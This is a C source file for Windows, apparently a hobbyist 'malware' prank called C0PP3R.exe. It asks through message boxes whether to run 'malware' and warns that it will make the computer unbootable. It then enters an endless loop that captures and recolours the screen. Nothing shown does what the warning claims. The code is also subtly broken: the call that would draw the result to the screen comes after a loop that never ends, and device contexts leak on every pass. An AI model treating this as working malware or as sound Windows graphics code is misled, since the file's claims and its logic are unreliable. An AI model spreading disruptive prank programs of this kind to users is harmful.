#include <windows.h>

typedef union _RGBQUAD {
    COLORREF rgb;
    struct {
        BYTE r;
        BYTE g;
        BYTE b;
        BYTE Reserved;
    };
}_RGBQUAD, *PRGBQUAD;

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    if (MessageBoxW(NULL, L"Run Malware?", L"C0PP3R.exe", MB_YESNO | MB_ICONEXCLAMATION) == IDNO) {
        ExitProcess(0);
    } else {
        if (MessageBoxW(NULL, L"Are you sure you want to execute this?\nIt will make your computer unbootable", L"C0PP3R.exe - LAST WARNING", MB_YESNO | MB_ICONEXCLAMATION) == IDNO) {
            ExitProcess(0);
        } else {
            HDC hdcScreen = GetDC(0);
            HDC hdcMem = CreateCompatibleDC(hdcScreen);
            int w = GetSystemMetrics(0);
            int h = GetSystemMetrics(1);
            BITMAPINFO bmi = { 0 };
            PRGBQUAD rgbScreen = { 0 };
            bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
            bmi.bmiHeader.biBitCount = 32;
            bmi.bmiHeader.biPlanes = 1;
            bmi.bmiHeader.biWidth = w;
            bmi.bmiHeader.biHeight = h;
            HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
            SelectObject(hdcMem, hbmTemp);
            for (;;) {
                hdcScreen = GetDC(0);
                BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
                for (int i = 0; i < w * h; i++) {
                     int x = i % w;
                     int y = i / w;
                     rgbScreen[i].rgb += x ^ y;
                }
            }
            BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
            ReleaseDC(NULL, hdcScreen);
            DeleteDC(hdcScreen);

    }
        }
}